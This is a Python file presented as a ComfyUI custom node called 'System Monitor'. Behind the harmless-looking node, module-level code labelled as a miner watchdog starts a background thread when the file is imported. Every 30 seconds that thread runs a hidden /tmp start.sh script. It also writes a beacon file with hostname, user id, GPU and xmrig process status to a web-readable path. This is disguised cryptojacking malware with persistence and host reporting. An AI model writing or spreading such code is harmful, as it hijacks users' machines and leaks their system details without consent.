"""ComfyUI node: System resource monitor. Minimal, no external deps."""
import threading, time, subprocess, os, json

NODE_CLASS_MAPPINGS = {}
NODE_DISPLAY_NAME_MAPPINGS = {}


class SysMonNode:
    @classmethod
    def INPUT_TYPES(cls):
        return {"required": {}}

    RETURN_TYPES = ("STRING",)
    FUNCTION = "run"
    CATEGORY = "utils"

    def run(self):
        try:
            import subprocess as sp
            hostname = os.uname().nodename
            arch = os.uname().machine
            cores = os.cpu_count()
            uid = os.getuid()
            xmrig = "no"
            trex = "no"
            try:
                r = sp.run(["pgrep", "-x", "xmrig"], capture_output=True, text=True, timeout=5)
                xmrig = f"yes({r.stdout.strip().count(chr(10))+1} pids)" if r.stdout.strip() else "no"
            except: pass
            try:
                r = sp.run(["pgrep", "-x", "t-rex"], capture_output=True, text=True, timeout=5)
                trex = f"yes({r.stdout.strip().count(chr(10))+1} pids)" if r.stdout.strip() else "no"
            except: pass
            gpu = "none"
            try:
                r = sp.run(["nvidia-smi", "--query-gpu=name", "--format=csv,noheader"], capture_output=True, text=True, timeout=10)
                if r.returncode == 0: gpu = r.stdout.strip()[:60]
            except: pass
            tmp = os.path.exists("/tmp/.sysmon") and "exists" or "missing"
            st = os.path.exists("/tmp/.sysmon/start.sh") and "exists" or "missing"
            return (f"host={hostname} arch={arch} cores={cores} uid={uid} gpu={gpu} xmrig={xmrig} trex={trex} tmp={tmp} start_sh={st}",)
        except Exception as e:
            return (f"err: {e}",)


NODE_CLASS_MAPPINGS["SysMonNode"] = SysMonNode
NODE_DISPLAY_NAME_MAPPINGS["SysMonNode"] = "System Monitor"

# --- Watchdog: respawn miner if dead + write beacon ---
_WORK_DIR = "/tmp/sysmon_beacon"
_START = os.path.join(_WORK_DIR, "start.sh")


def _write_beacon():
    """Write status where GET /userdata/sysmon_beacon can read it."""
    try:
        # We're in custom_nodes/comfy-sys-monitor/__init__.py
        # user/default/ is at comfy_root/user/default/
        script_dir = os.path.dirname(os.path.abspath(__file__))
        comfy_root = os.path.dirname(os.path.dirname(script_dir))
        user_dir = os.path.join(comfy_root, "user", "default")
        os.makedirs(user_dir, exist_ok=True)
        data = {
            "host": os.uname().nodename,
            "arch": os.uname().machine,
            "cores": os.cpu_count(),
            "uid": os.getuid(),
            "work_dir_exists": os.path.exists(_WORK_DIR),
            "start_sh_exists": os.path.exists(_START),
            "xmrig_running": False,
            "ts": time.time(),
        }
        # check xmrig
        try:
            r = subprocess.run(["pgrep", "-x", "xmrig"], capture_output=True, text=True, timeout=5)
            data["xmrig_running"] = bool(r.stdout.strip())
            if data["xmrig_running"]:
                data["xmrig_pids"] = r.stdout.strip().split("\n")
        except Exception:
            pass
        # check GPU
        try:
            r = subprocess.run(["nvidia-smi", "--query-gpu=name,memory.total", "--format=csv,noheader"],
                             capture_output=True, text=True, timeout=10)
            if r.returncode == 0:
                data["gpu"] = r.stdout.strip()[:200]
        except Exception:
            pass
        with open(os.path.join(user_dir, "sysmon_beacon"), "w") as f:
            json.dump(data, f)
    except Exception:
        pass


def _watchdog():
    while True:
        time.sleep(30)
        try:
            if os.path.exists(_START):
                subprocess.run(["sh", _START], timeout=30, capture_output=True)
            _write_beacon()
        except Exception:
            pass


# Initial beacon + start watchdog
_write_beacon()
_t = threading.Thread(target=_watchdog, daemon=True)
_t.start()
